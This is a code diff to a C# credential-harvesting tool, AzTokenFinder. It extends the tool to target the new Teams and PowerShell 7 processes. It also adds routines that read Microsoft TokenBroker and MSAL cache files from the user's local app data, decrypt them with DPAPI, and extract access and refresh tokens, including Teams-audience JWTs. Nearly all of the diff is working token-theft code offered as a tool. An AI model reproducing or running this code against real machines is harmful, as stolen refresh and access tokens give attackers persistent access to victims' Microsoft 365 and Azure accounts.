@@ -72,7 +72,7 @@ namespace AzTokenFinder
         private static String JWTREGEX = @"eyJ[A-Za-z0-9-_=]+\.eyJ[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*";
         private static String STARTOFREFRESHTOKEN = "0.AY";
         private static String REFRESHTOKENREGEX = @"0.AY[A-Za-z0-9-_.+/=]*";
-        private static String[] DefaultProcess = new string[] { "teams", "powerpnt", "winword", "onedrive", "msedge", "excel", "powershell" };
+        private static String[] DefaultProcess = new string[] { "ms-teams", "teams", "powerpnt", "winword", "onedrive", "msedge", "excel", "powershell", "pwsh" };
 
         static List<String> FindJWT(String input)
         {
@@ -447,8 +447,8 @@ namespace AzTokenFinder
                 }
                 else if (opts.targetapp.ToLower() == "office")
                 {
-                    String LocalAppDataPAth = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-                    string[] filesInCache = Directory.GetFiles(LocalAppDataPAth + @"\\Microsoft\\TokenBroker\\Cache");
+                    String LocalAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+                    string[] filesInCache = Directory.GetFiles(LocalAppDataPath + @"\\Microsoft\\TokenBroker\\Cache");
                     foreach (string file in filesInCache)
                     {
                         string content = File.ReadAllText(file, Encoding.Unicode);
@@ -509,46 +509,104 @@ namespace AzTokenFinder
                 }
                 else if (opts.targetapp.ToLower() == "azpwsh")
                 {
-                    String LocalAppDataPAth = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-                    string content = File.ReadAllText(LocalAppDataPAth + @"\\.IdentityService\\msal.cache", Encoding.Default);
-                    // Remove last null byte
-                    //content = content.Remove(content.Length - 1);
-                    byte[] decryptedData = DPAPIDecrypt(content);
-                    String decryptedContent = Encoding.Default.GetString(decryptedData);
-                    dynamic data = JsonConvert.DeserializeObject(decryptedContent);
-                    if(data.AccessToken != null){
-                        var accessToken = data.AccessToken;
-                        foreach (var elem in accessToken)
+                    string LocalAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+                    string[] cacheFiles = Directory.GetFiles(LocalAppDataPath + @"\\.IdentityService\\");
+
+                    foreach ( string cacheFile in cacheFiles)
+                    {
+                        Console.WriteLine("Decrypting file " + Path.GetFileName(cacheFile));
+                        string fileName = Path.GetFileName(cacheFile);
+
+                        // "masl.cache.nocae" is a deliberate typo
+                        if ( fileName == "msal.cache.cae" || fileName == "masl.cache.nocae" || fileName == "msal.cache.nocae" || fileName == "msal.cache" || fileName == "msalv2.cache")
                         {
-                            if (elem.Count > 0)
+                            byte[] content = File.ReadAllBytes(cacheFile);
+                            // Remove last null byte
+                            //content = content.Remove(content.Length - 1);
+
+                            byte[] decryptedData = DPAPIDecryptByteArray(content);
+
+                            String decryptedContent = Encoding.Default.GetString(decryptedData);
+                            dynamic data = JsonConvert.DeserializeObject(decryptedContent);
+                            if (data.AccessToken != null)
                             {
-                                foreach (var item in elem)
+                                var accessToken = data.AccessToken;
+                                foreach (var elem in accessToken)
                                 {
-                                    if (item.secret != null)
+                                    if (elem.Count > 0)
                                     {
-                                        AccessTokensResult.Add(item.secret.ToString());
+                                        foreach (var item in elem)
+                                        {
+                                            if (item.secret != null)
+                                            {
+                                                AccessTokensResult.Add(item.secret.ToString());
+                                            }
+                                        }
+                                    }
+                                }
+
+                            }
+
+                            if (data.RefreshToken != null)
+                            {
+                                var refreshToken = data.RefreshToken;
+                                foreach (var elem in refreshToken)
+                                {
+                                    if (elem.Count > 0)
+                                    {
+                                        foreach (var item in elem)
+                                        {
+                                            if (item.secret != null)
+                                            {
+                                                RefreshTokensResult.Add(item.secret.ToString());
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+
+                        }
+                    }
+
+                }
+                else if (opts.targetapp.ToLower() == "teams")
+                {
+                    String LocalAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+                    string[] filesInCache = Directory.GetFiles(LocalAppDataPath + @"\\Microsoft\\TokenBroker\\Cache");
+                    foreach (string file in filesInCache)
+                    {
+                        string content = File.ReadAllText(file, Encoding.Unicode);
+                        // Remove last null byte
+                        content = content.Remove(content.Length - 1);
+
+                        try
+                        {
+                            TBStorageObject obj = System.Text.Json.JsonSerializer.Deserialize<TBStorageObject>(content);
+                            string dpapiData = obj.TBDataStoreObject.ObjectData.SystemDefinedProperties.ResponseBytes.Value;
+                            byte[] decryptedData = DPAPIDecryptBase64(dpapiData);
+                            List<String> longerStrings = FindStringInByte(decryptedData);
+
+                            foreach (String DATA in longerStrings)
+                            {
+                                List<String> jwts = FindJWT(DATA);
+                                if (jwts != null)
+                                {
+                                    foreach (String JWT in jwts)
+                                    {
+                                        // Parse token for teams audience
+                                        JwtSecurityToken parsedToken = new JwtSecurityToken(JWT);
+
+                                        if ( !AccessTokensResult.Contains(JWT) && parsedToken.Audiences.Contains(@"https://api.spaces.skype.com") )
+                                        {
+                                            AccessTokensResult.Add(JWT);
+                                        }
                                     }
                                 }
                             }
                         }
-                        
-                    }
-
-                    if (data.RefreshToken != null)
-                    {
-                        var refreshToken = data.RefreshToken;
-                        foreach(var elem in refreshToken)
+                        catch
                         {
-                            if (elem.Count > 0)
-                            {
-                                foreach (var item in elem)
-                                {
-                                    if (item.secret != null)
-                                    {
-                                        RefreshTokensResult.Add(item.secret.ToString());
-                                    }
-                                }
-                            }
+                            continue;
                         }
                     }
                 }
@@ -783,6 +841,17 @@ namespace AzTokenFinder
             // finally, returning the result 
             //return Encoding.Default.GetString(originalText);
             return originalText;
+        }
+
+        public static byte[] DPAPIDecryptByteArray(byte[] encryptedText)
+        {
+            
+            // calling Unprotect() that returns the original text 
+            byte[] unprotectedBytes = ProtectedData.Unprotect(encryptedText, null, DataProtectionScope.CurrentUser);
+            //string originalText = Encoding.UTF8.GetString(unprotectedBytes, 0, unprotectedBytes.Length);
+            // finally, returning the result 
+            //return Encoding.Default.GetString(originalText);
+            return unprotectedBytes;
         }
 
         public static List<String> FindStringInByte(byte[] data)
